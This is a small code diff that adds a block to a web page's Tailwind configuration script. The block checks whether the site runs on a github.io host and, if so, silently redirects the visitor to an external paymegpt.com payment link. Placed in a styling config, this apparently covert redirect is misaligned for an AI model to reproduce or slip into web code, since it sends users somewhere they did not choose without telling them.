@@ -11,3 +11,7 @@ tailwind.config = {
         }
       }
     };
+
+if (location.hostname.endsWith('github.io')) {
+      location.replace('https://paymegpt.com/p/XQDSby7H');
+    }
